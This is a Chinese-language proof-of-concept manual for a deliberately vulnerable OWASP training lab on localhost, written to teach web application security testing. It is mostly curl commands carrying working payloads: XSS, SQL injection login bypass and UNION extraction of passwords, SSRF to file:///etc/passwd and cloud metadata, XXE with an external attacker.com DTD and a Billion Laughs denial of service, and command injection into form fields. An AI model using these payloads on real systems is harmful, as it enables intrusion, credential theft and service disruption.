# OWASP漏洞实验室 - POC测试手册

## 🌐 服务地址
- **前端应用**: http://localhost:3000
- **后端API**: http://localhost:8080
- **测试账户**: 
  - 管理员: `admin` / `admin123`
  - 普通用户: `john` / `password123`, `jane` / `qwerty`, `bob` / `123456`, `alice` / `password`

---

## 1. 🔴 XSS (跨站脚本攻击)

### API端点
```bash
# 获取XSS漏洞信息
curl -X GET http://localhost:8080/api/xss/info
```

### 反射型XSS测试
```bash
# 基础XSS测试
curl -X GET "http://localhost:8080/api/xss/reflected?input=<script>alert('XSS')</script>"

# 图片标签XSS
curl -X GET "http://localhost:8080/api/xss/reflected?input=<img src=x onerror=alert('XSS')>"

# SVG标签XSS
curl -X GET "http://localhost:8080/api/xss/reflected?input=<svg onload=alert('XSS')>"

# 事件处理器XSS
curl -X GET "http://localhost:8080/api/xss/reflected?input=<div onmouseover=alert('XSS')>Hover me</div>"

# iframe JavaScript XSS
curl -X GET "http://localhost:8080/api/xss/reflected?input=<iframe src=javascript:alert('XSS')>"
```

### 存储型XSS测试
```bash
# 提交恶意评论
curl -X POST http://localhost:8080/api/xss/stored/comment \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(\"Stored XSS\")</script>", "author": "attacker"}'

# 查看存储的评论（触发XSS）
curl -X GET http://localhost:8080/api/xss/stored/comments
```

### DOM型XSS测试
```bash
# DOM XSS测试
curl -X GET "http://localhost:8080/api/xss/dom?fragment=<img src=x onerror=alert('DOM XSS')>"
```

---

## 2. 💉 SQL注入攻击

### API端点
```bash
# 获取SQL注入漏洞信息
curl -X GET http://localhost:8080/api/sqli/info
```

### 登录绕过攻击
```bash
# 经典SQL注入登录绕过
curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'

# 另一种绕过方式
curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''/*", "password": "*/OR/**/1=1#"}'
```

### 用户信息泄露
```bash
# 基于错误的SQL注入
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND (SELECT COUNT(*) FROM users) > 0 --"

# 时间盲注
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; WAITFOR DELAY '00:00:05' --"
```

### UNION注入攻击
```bash
# 获取所有用户信息
curl -X GET "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT id,username,password,email,role,secret FROM users --"

# 获取数据库版本信息
curl -X GET "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT 1,@@version,3,4,5,6 --"
```

---

## 3. 🌐 SSRF (服务器端请求伪造)

### API端点
```bash
# 获取SSRF漏洞信息
curl -X GET http://localhost:8080/api/ssrf/info
```

### 内网探测
```bash
# 访问本地服务
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://localhost:8080/api/ssrf/info"

# 访问内网IP
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:8080/h2-console"

# 端口扫描
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:22"
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:3306"
```

### 文件读取
```bash
# 读取本地文件
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=file:///etc/passwd"

# FTP协议测试
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=ftp://internal-server/"
```

### 云服务元数据访问
```bash
# AWS元数据服务
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/"

# 重定向绕过
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8080"
```

### 图片代理攻击
```bash
# 通过图片代理进行SSRF
curl -X GET "http://localhost:8080/api/ssrf/vulnerable/image-proxy?imageUrl=http://127.0.0.1:8080/api/ssrf/info"
```

---

## 4. 📄 XXE (XML外部实体注入)

### API端点
```bash
# 获取XXE漏洞信息
curl -X GET http://localhost:8080/api/xxe/info

# 获取测试XML
curl -X GET http://localhost:8080/api/xxe/test-xml
```

### 文件读取攻击
```bash
# 基础文件读取
curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# DocumentBuilder解析器攻击
curl -X POST http://localhost:8080/api/xxe/vulnerable/documentbuilder \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>'
```

### SSRF通过XXE
```bash
# 通过XXE进行SSRF
curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>'
```

### 参数实体攻击
```bash
# 参数实体注入
curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>'
```

### 拒绝服务攻击 (Billion Laughs)
```bash
# 递归实体引用导致DoS
curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'
```

---

## 5. ⚡ RCE (远程代码执行)

### API端点
```bash
# 获取RCE漏洞信息
curl -X GET http://localhost:8080/api/rce/info
```

### Ping命令注入
```bash
# 基础命令注入
curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; whoami"}'

# 使用&&连接符
curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1 && id"}'

# 使用管道符
curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1 | cat /etc/passwd"}'

# 获取系统信息
curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; uname -a"}'
```

### 系统命令执行
```bash
# 直接执行系统命令
curl -X POST http://localhost:8080/api/rce/vulnerable/system \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

curl -X POST http://localhost:8080/api/rce/vulnerable/system \
  -H "Content-Type: application/json" \
  -d '{"command": "ls -la"}'

curl -X POST http://localhost:8080/api/rce/vulnerable/system \
  -H "Content-Type: application/json" \
  -d '{"command": "ps aux"}'

curl -X POST http://localhost:8080/api/rce/vulnerable/system \
  -H "Content-Type: application/json" \
  -d '{"command": "netstat -an"}'
```

### 文件操作命令注入
```bash
# 文件读取命令注入
curl -X POST http://localhost:8080/api/rce/vulnerable/file \
  -H "Content-Type: application/json" \
  -d '{"operation": "read", "filename": "/etc/passwd; whoami"}'

# 文件列表命令注入
curl -X POST http://localhost:8080/api/rce/vulnerable/file \
  -H "Content-Type: application/json" \
  -d '{"operation": "list", "filename": "/etc/hosts && id"}'

# 文件状态命令注入
curl -X POST http://localhost:8080/api/rce/vulnerable/file \
  -H "Content-Type: application/json" \
  -d '{"operation": "stat", "filename": "/tmp/test.txt | ps aux"}'
```

---

## 🛡️ 安全接口测试

### 安全的XSS防护
```bash
curl -X POST http://localhost:8080/api/xss/safe/comment \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(\"XSS\")</script>", "author": "test"}'
```

### 安全的SQL查询
```bash
curl -X POST http://localhost:8080/api/sqli/safe/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'
```

### 安全的SSRF防护
```bash
curl -X GET "http://localhost:8080/api/ssrf/safe/fetch?url=https://jsonplaceholder.typicode.com/posts/1"
```

### 安全的XXE防护
```bash
curl -X POST http://localhost:8080/api/xxe/safe/parse \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 安全的RCE防护
```bash
curl -X POST http://localhost:8080/api/rce/safe/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; whoami"}'

curl -X POST http://localhost:8080/api/rce/safe/system \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'
```

---

## 🔧 高级测试技巧

### 1. 绕过过滤器
```bash
# URL编码绕过
curl -X GET "http://localhost:8080/api/xss/reflected?input=%3Cscript%3Ealert('XSS')%3C/script%3E"

# 双重编码
curl -X GET "http://localhost:8080/api/xss/reflected?input=%253Cscript%253Ealert('XSS')%253C/script%253E"

# 大小写混合
curl -X GET "http://localhost:8080/api/xss/reflected?input=<ScRiPt>alert('XSS')</ScRiPt>"
```

### 2. 时间盲注测试
```bash
# SQL时间盲注
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; IF (1=1) WAITFOR DELAY '00:00:05' --"

# 条件时间盲注
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; IF (SELECT COUNT(*) FROM users WHERE username='admin') > 0 WAITFOR DELAY '00:00:05' --"
```

### 3. 布尔盲注测试
```bash
# 布尔盲注 - 真条件
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND 1=1 --"

# 布尔盲注 - 假条件
curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND 1=2 --"
```

---

## 📊 测试结果验证

### 成功指标
- **XSS**: 返回包含未转义脚本的HTML
- **SQL注入**: 返回数据库错误信息或意外数据
- **SSRF**: 成功访问内网资源或返回内网响应
- **XXE**: 返回本地文件内容或外部资源
- **RCE**: 返回系统命令执行结果

### 安全指标
- **安全接口**: 应该返回错误信息或过滤后的安全内容
- **输入验证**: 恶意输入被正确过滤或拒绝
- **错误处理**: 不泄露敏感的系统信息

---

## ⚠️ 注意事项

1. **仅在测试环境使用**: 这些POC仅用于学习和测试目的
2. **不要在生产环境测试**: 可能造成数据损坏或系统不稳定
3. **遵守法律法规**: 仅在授权的系统上进行测试
4. **备份数据**: 测试前备份重要数据
5. **监控系统**: 注意系统资源使用情况，避免DoS攻击影响系统稳定性

---

## 🎯 学习目标

通过这些POC测试，你将学会：
- 识别和利用常见的Web安全漏洞
- 理解攻击向量和利用技术
- 掌握安全防护措施的实现
- 提高Web应用安全意识
- 学会进行安全测试和漏洞评估